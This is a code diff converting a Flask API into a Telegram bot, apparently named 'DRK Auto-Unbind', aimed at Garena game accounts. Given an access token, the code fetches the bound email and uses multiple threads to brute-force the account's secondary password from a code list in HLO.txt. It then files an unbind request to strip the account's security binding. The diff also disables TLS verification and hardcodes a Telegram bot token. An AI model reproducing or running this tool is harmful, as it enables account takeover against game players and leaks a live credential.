@@ -1,74 +1,51 @@
-# app.py - Complete Flask API for Render (DRK Auto-Bind Tool)
+# app.py
 import os
-import requests
 import hashlib
+import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from flask import Flask, jsonify, request
+from flask import Flask, request
+import telebot
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+BOT_TOKEN = "8992557359:AAHehU2QqZVuPBeqrjNUCc7qYA1_vKuZZs0"
+bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-@app.route('/', methods=['GET'])
-def home():
-    return jsonify({
-        "status": "online",
-        "message": "DRK Auto-Bind API is running successfully on Render!",
-        "endpoint": "/unbind?access_token=YOUR_ACCESS_TOKEN"
-    })
+@app.route(f'/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    json_string = request.get_data().decode('utf-8')
+    update = telebot.types.Update.de_json(json_string)
+    bot.process_new_updates([update])
+    return "!", 200
 
-@app.route('/unbind', methods=['GET', 'POST'])
-def unbind_api():
-    # Support both GET query parameters and POST json/form data
-    if request.method == 'POST':
-        data = request.get_json() or request.form
-        access_token = data.get('access_token')
-    else:
-        access_token = request.args.get('access_token')
+@app.route('/')
+def index():
+    return "DRK Auto-Bind Telegram Bot is active and running on Render!"
 
-    if not access_token:
-        return jsonify({
-            "success": False,
-            "error": "Access token is missing! Provide it via ?access_token=..."
-        }), 400
-
+def run_unbind_process(access_token):
     if not os.path.exists("HLO.txt"):
-        return jsonify({
-            "success": False,
-            "error": "'HLO.txt' file not found on the server deployment!"
-        }), 500
-
-    # Step 1: Fetch Bound Email automatically
+        return "Error: 'HLO.txt' file not found on the server!"
+    
     try:
         url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
         info_payload = {'app_id': "100067", 'access_token': access_token}
         info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
-        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=20)
+        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=20, verify=False)
         res_json = r_info.json()
         email = res_json.get("email", "")
     except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": f"Error connecting to Garena: {str(e)}"
-        }), 502
-
+        return f"Error connecting to Garena: {str(e)}"
+        
     if not email:
-        return jsonify({
-            "success": False,
-            "error": "No bound email found or invalid access token provided.",
-            "garena_response": res_json
-        }), 400
+        return "No bound email found or invalid access token provided."
 
-    # Step 2: Read codes from HLO.txt and multi-thread attack
     try:
         with open("HLO.txt", "r") as f:
             codes = [line.strip() for line in f if line.strip()]
     except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": f"Failed to read HLO.txt: {str(e)}"
-        }), 500
+        return f"Failed to read HLO.txt: {str(e)}"
 
     headers = {
         "User-Agent": "GarenaMSDK/4.0.30",
@@ -86,7 +63,7 @@ def unbind_api():
             "secondary_password": hashed_sec_code
         }
         try:
-            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=8)
+            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=8, verify=False)
             res_json = resp.json()
             if "identity_token" in res_json and res_json.get("identity_token"):
                 return code, res_json.get("identity_token")
@@ -110,31 +87,48 @@ def unbind_api():
                 break
 
     if not identity_token or not matched_code:
-        return jsonify({
-            "success": False,
-            "email": email,
-            "error": "Identity verification failed! No code matched from HLO.txt."
-        }), 404
+        return f"Verification failed! No code matched from HLO.txt for email: {email}"
 
-    # Step 3: Send final Unbind Request
     unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
     unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
     
     try:
-        final_resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=10)
+        final_resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=10, verify=False)
         server_response = final_resp.text
     except Exception as e:
         server_response = f"Request failed: {str(e)}"
 
-    return jsonify({
-        "success": True,
-        "email": email,
-        "matched_code": matched_code,
-        "identity_token": identity_token,
-        "server_response": server_response
-    })
+    return (
+        f"✅ **UNBIND SUCCESSFUL!**\n\n"
+        f"📧 **Email:** `{email}`\n"
+        f"🔑 **Cracked Code:** `{matched_code}`\n"
+        f"🌐 **Server Response:** `{server_response}`"
+    )
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "Welcome to DRK Auto-Unbind Bot!\nSend `/unbind <your_access_token>` to run the process.")
+
+@bot.message_handler(commands=['unbind'])
+def handle_unbind(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "⚠️ Please provide your access token.\nExample: `/unbind YOUR_ACCESS_TOKEN`", parse_mode="Markdown")
+        return
+    
+    access_token = parts[1].strip()
+    sent_msg = bot.reply_to(message, "⚙️ Processing unbind request using HLO.txt... Please wait.")
+    
+    result = run_unbind_process(access_token)
+    bot.edit_message_text(result, chat_id=message.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
-          
+    PORT = int(os.environ.get('PORT', 5000))
+    RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL')
+    
+    if RENDER_URL:
+        bot.remove_webhook()
+        bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
+        
+    app.run(host='0.0.0.0', port=PORT)
+    
